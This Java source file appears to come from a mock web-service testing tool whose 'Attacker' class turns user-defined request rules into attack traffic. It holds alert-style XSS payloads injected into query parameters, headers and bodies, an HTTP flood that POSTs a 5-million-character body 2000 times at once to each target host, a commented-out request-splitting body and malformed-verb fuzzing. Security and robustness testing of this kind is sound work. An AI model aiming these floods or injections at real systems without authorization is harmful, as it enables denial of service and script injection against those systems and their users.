import model.InOutRule;
import model.OutInRule;
import model.Request;
import model.Rule;

import java.io.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * An attacker is created when the user request the web service with the "/attack" query parameter.
 * It has 3 lists: XSS scripts, mock rules and attack rules (which are created from the existing rules).
 */
public class Attacker {
    private List<String> scripts;
    private List<Rule> rules;
    private List<Rule> attackRules;

    /**
     * The constructor instantiates the different lists and add the rules and XSS scripts.
     * @param rules: mock rules given by the user.
     */
    public Attacker(List<Rule> rules) {
        this.attackRules = new ArrayList<>();
        this.rules = new ArrayList<>();
        this.rules.addAll(rules);
        this.scripts = new ArrayList<>();
        scripts.add("<script>alert('XSS')</script>");
        scripts.add("<img src=javascript:alert('XSS')>");
        scripts.add("</script><script>alert('XSS')</script>");
        scripts.add("<svg onload=alert('XSS')>");
    }

    /**
     * This method is called at the end of the attack handler.
     * It create and start an output request for each attack rule created before.
     */
    public void attack() {
        for(Rule rule: attackRules) {
            new OutputRequest((OutInRule) rule).start();
        }
    }

    /**
     * This method call the 3 different XSS methods.
     * The first one use a different script because the script has to be encoded to be sent
     * in the http request query parameters.
     */
    public void XSSAttacks() {
        XSSQueryParams();
        for(String script: scripts) {
            XSSHeaders(script);
            XSSBody(script);
        }
    }

    /**
     * This method extract all the query parameters from the http request URI and change each
     * parameter value to the XSS script.
     */
    private void XSSQueryParams() {
        Pattern pattern = Pattern.compile("(.*\\?)([^=]*=.*)");
        Matcher matcher;
        String[] params;
        String path;
        Map<String,String> paramMap = new LinkedHashMap<>();
        Set<Map.Entry<String, String>> paramSet;
        Iterator<Map.Entry<String, String>> it;
        for(Rule rule: rules) {
            paramMap.clear();
            if(rule instanceof InOutRule) {
                continue;
            }
            matcher = pattern.matcher(rule.getRequest().getPath());
            if(matcher.find()) {
                params = matcher.group(2).split("&");
            } else return;
            for(String param: params) {
                paramMap.put(param.split("=")[0],"");
            }
            paramSet = paramMap.entrySet();
            it = paramSet.iterator();
            path = matcher.group(1);
            while(it.hasNext()) {
                Map.Entry<String, String> e = it.next();
                path = path.concat(e.getKey() + "=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&");
            }
            path = path.substring(0,path.length()-1);
            attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(),path,rule.getRequest().getHeaders(),rule.getRequest().getBody()), null, 0L, 1, 0L));
        }
    }

    /**
     * This method extract all the headers from the http request and change each
     * value to the XSS script.
     * @param script: the XSS script which is gonna be injected.
     */
    private void XSSHeaders(String script) {
        Map<String, String> headersMap = new HashMap<>();
        for(Rule rule: rules) {
            if (rule instanceof InOutRule) {
                continue;
            }
            if (rule.getRequest().getHeaders().size() != 0) {
                for (String k : rule.getRequest().getHeaders().keySet()) {
                    headersMap.put(k, script);
                }
                attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(), rule.getRequest().getPath(), headersMap, rule.getRequest().getBody()), null, 0L, 1, 0L));
            } else return;
        }
    }

    /**
     * This method extract the body from the http request and change its value to the XSS script.
     * @param script: the XSS script which is gonna be injected.
     */
    private void XSSBody(String script) {
        for(Rule rule: rules) {
            if(rule instanceof InOutRule) {
                continue;
            }
            String body = rule.getRequest().getBody();
            if(!body.equals("")){
                body = script;
                attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(), rule.getRequest().getPath(), rule.getRequest().getHeaders(), body), null, 0L, 1, 0L));
            } else return;
        }
    }


    /**
     * Generate a random String of 5 000 000 alpha-numeric characters
     * Write this String in a text file and save it
     */
    private void generateBigFile() throws IOException {
        int maxSize = 5000000;
        String allowedCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sbRandomString = new StringBuilder(maxSize);
        for (int i = 0; i < maxSize; i++) {
            int index = ((int) (allowedCharacters.length() * Math.random()));
            sbRandomString.append(allowedCharacters.charAt(index));
        }
        String randomString = sbRandomString.toString();
        BufferedWriter bwBigFile = new BufferedWriter(new FileWriter("bigFileHttpFlood.txt"));
        bwBigFile.write(randomString);
        bwBigFile.close();
    }

    /**
     * Read and add each line of the file in a StringBuilder variable
     * @return The random String extracted from the text file
     */
    private String readFile() throws IOException {
        BufferedReader brBigFile = new BufferedReader(new FileReader("bigFileHttpFlood.txt"));
        StringBuilder sbContent = new StringBuilder();
        String line;
        while ((line = brBigFile.readLine()) != null) {
            sbContent.append(line);
        }
        brBigFile.close();
        return sbContent.toString();
    }

    /**
     * For each OutInRule, get path and extract the ip or the domain name
     * @return The list of the paths contained in OutIn rules
     */
    public List<String> getPaths() {
        List<String> paths = new ArrayList<>();
        for (Rule rule : rules) {
            if (rule instanceof InOutRule) {
                continue;
            }
            Pattern pattern = Pattern.compile("(https?:\\/\\/([^/]*))");
            Matcher matcher = pattern.matcher(rule.getRequest().getPath());
            if (matcher.find()) {
                paths.add(matcher.group(1));
            }
        }
        return paths;
    }

    /**
     * Generate the file if not exists and read this
     * For each connected object, add an OutInRule with the random String generated in the request body
     * This rule is sent 2000 times simultaneous to the specified path
     */
    public void httpFloodAttack() throws IOException {
        generateBigFile();
        String content = readFile();
        for (String path : getPaths()) {
            attackRules.add(new OutInRule(new Request("POST", path, null, content),
                    null, 0L, 2000, 0L));
        }
    }

    /*public void requestSplittingAttack() {
        Map<String, String> headers = new HashMap<>();
        headers.put("Transfert-Encoding", "chunked");
        for (String path : getPaths()) {
            //Request reqToInject = new Request("POST", path, null, "HTTP Request Splitting Attack");
            OutInRule reqSplittingRule = new OutInRule(new Request("POST", path, headers, "\r\n\r\n0\r\n\r\n"+"POST+%2F+HTTP%2F1.1%0D%0AHost%3A+"+path),
                    null, 0L, 1, null);
            attackRules.add(reqSplittingRule);
        }
    }*/


    /**
     * Method which call all or selected robustness attacks
     */
    public void robustnessAttacks() {
        verbNotExist();
        specialChar();
        emptyVerb();
    }

    /**
     * For each existing OutInRule, replace original method with a wrong method and add it in attackRules list
     */
    private void verbNotExist() {
        for (Rule rule : rules) {
            attackRules.add(new OutInRule(new Request("wrongVerb", rule.getRequest().getPath(), rule.getRequest().getHeaders(),
                    rule.getRequest().getBody()), null, 0L, 1, null));
        }
    }

    /**
     * For each existing OutInRule, replace original method with an empty parameter
     */
    private void emptyVerb() {
        for (Rule rule : rules) {
            attackRules.add(new OutInRule(new Request("", rule.getRequest().getPath(), rule.getRequest().getHeaders(),
                    rule.getRequest().getBody()), null, 0L, 1, null));
        }
    }

    /**
     * For each existing OutInRule, add two special characters to original method
     */
    private void specialChar() {
        for (Rule rule : rules) {
            String method = rule.getRequest().getMethod();
            method = new StringBuffer(method).insert(1, "@").insert(3, "€").toString();
            attackRules.add(new OutInRule(new Request(method, rule.getRequest().getPath(), rule.getRequest().getHeaders(),
                    rule.getRequest().getBody()), null, 0L, 1, null));
        }
    }
}
